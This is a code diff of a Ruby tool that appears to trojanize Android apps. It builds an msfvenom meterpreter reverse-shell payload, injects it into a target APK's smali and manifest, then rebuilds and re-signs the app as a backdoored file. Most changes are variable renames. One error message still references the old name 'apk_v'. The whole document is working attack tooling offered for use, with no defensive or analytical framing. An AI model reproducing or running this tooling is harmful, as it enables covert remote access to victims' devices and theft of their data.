@@ -6,6 +6,7 @@ require 'fileutils'
 require 'optparse'
 require 'colorize'
 require 'securerandom'
+
 puts "
 ██╗  ██╗ ██████╗ ██████╗ ██████╗ ██████╗ ██████╗ ███████╗
 ╚██╗██╔╝██╔════╝██╔═████╗██╔══██╗╚════██╗██╔══██╗╚══███╔╝
@@ -134,11 +135,11 @@ def randomString(size = 6)
   charset = %w{ 2 3 4 6 7 9 A C D E F G H J K M N P Q R T V W X Y Z}
   (0...size).map{ charset.to_a[rand(charset.size)] }.join
 end
-work_dir = Dir.pwd + "/";
-output_dir = work_dir+ "tmp/" +randomString(6)
-apkfile = ARGV[0]
-d_tools = "#{work_dir}/embed_tools/"
-unless(apkfile)
+workingDIR = Dir.pwd + "/";
+TempDir = workingDIR+ "tmp/" +randomString(6)
+ApkFile = ARGV[0]
+d_tools = "#{workingDIR}/embed_tools/"
+unless(ApkFile)
     puts "[+] Usage: #{$0} {target.apk} [msfvenom options]".red + "\n"
 	puts "[+] e.g. #{$0} messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443".cyan
 	exit(1)
@@ -148,8 +149,8 @@ unless(signapk && File.readable?(signapk))
 	puts "[+] Cannot find signapk tool".red
 	exit(1)
 end
-unless (File.readable?(apkfile))
-	puts "[-] Cannot find #{apkfile}".red + "\n";
+unless (File.readable?(ApkFile))
+	puts "[-] Cannot find #{ApkFile}".red + "\n";
 	exit(1);
 end
 apktool = "#{d_tools}apktool.jar"
@@ -157,8 +158,8 @@ unless(apktool && File.readable?(apktool))
 	puts "[+] Cannot find apktool tool".red
 	exit(1)
 end
-apk_v= `#{d_tools}apktool -version`;
-unless(apk_v.split()[0].include?("2."))
+apktool_version= `#{d_tools}apktool -version`;
+unless(apktool_version.split()[0].include?("2."))
 	puts "[-] Apktool version #{apk_v} not supported, please download the latest 2. version from git.\n".red
 	exit(1)
 end
@@ -176,14 +177,14 @@ rescue
 	puts "[-] Error parsing msfvenom options. Exiting.".red + "\n"
 	exit(1)
 end
-if (output_dir)
-	 `mkdir #{output_dir}`
+if (TempDir)
+	 `mkdir #{TempDir}`
 end
-payloadAPK  = "#{output_dir}/payload.apk"
-originalAPK = "#{output_dir}/original.apk"
-signAPK  = "#{output_dir}/signapk.apk"
-payloadDir  = "#{output_dir}/payload"
-originalDir = "#{output_dir}/original"
+payloadAPK  = "#{TempDir}/payload.apk"
+originalAPK = "#{TempDir}/original.apk"
+signAPK  = "#{TempDir}/signapk.apk"
+payloadDir  = "#{TempDir}/payload"
+originalDir = "#{TempDir}/original"
 puts "[1] Generating msfvenom payload".yellow
 res=`msfvenom -f raw #{opts} -o #{payloadAPK} 2>&1`
 if res.downcase.include?("invalid" || "error")
@@ -193,7 +194,7 @@ end
 
 puts "[2] Signing payload".yellow + "\n"
 `#{d_tools}apksign #{payloadAPK} #{signAPK}`
-`cp #{apkfile} #{originalAPK}`
+`cp #{ApkFile} #{originalAPK}`
 puts "[3] Decompiling orignal APK".yellow + "\n"
 `#{d_tools}apktool d #{originalAPK} -o #{originalDir}`
 print "[4] Decompiling payload APK".yellow + "\n"
@@ -228,17 +229,17 @@ hookedsmali = activitysmali.gsub(activitycreate, payloadhook)
 puts "[7] Loading ".yellow + File.basename(smalifile) + " and injecting payload".yellow + "\n"
 File.open(smalifile, "w") {|file| file.puts hookedsmali }
 
-injected_apk= "#{output_dir}/"+apkfile.split(".")[0]
+injected_apk= "#{TempDir}/"+ApkFile.split(".")[0]
 injected_apk+="_backdoored.apk"
 puts "[8] Poisoning the manifest with meterpreter permissions".yellow + "\n"
 fix_manifest(payloadDir,originalDir)
-puts "[9] Rebuilding #{apkfile} with metasploit payload in ".yellow + File.basename(injected_apk)+ "\n"
+puts "[9] Rebuilding #{ApkFile} with metasploit payload in ".yellow + File.basename(injected_apk)+ "\n"
 `#{d_tools}apktool b -o #{injected_apk} #{originalDir}`
 unless (File.readable?(injected_apk))
-puts "[-] Unable to rebuilding #{apkfile} with metasploit payload.".red
-puts "To fix it".blue;
+puts "[-] Unable to rebuilding #{ApkFile} with metasploit payload.".red + "\n"
+puts "See https://github.com/iBotPeaches/Apktool/issues/455 for more details.".blue + "\n";
 exit(1);
 end
 puts "[10] Signing".yellow + File.basename(injected_apk)+ "\n"
-`#{d_tools}apksign #{injected_apk} $(pwd)/__#{apkfile}_backdoored.apk`
-puts "[11] Infected file __#{apkfile}_backdoored.apk ready.".green
+`#{d_tools}apksign #{injected_apk} $(pwd)/__#{ApkFile}_backdoored.apk`
+puts "[11] Infected file __#{ApkFile}_backdoored.apk ready.".green
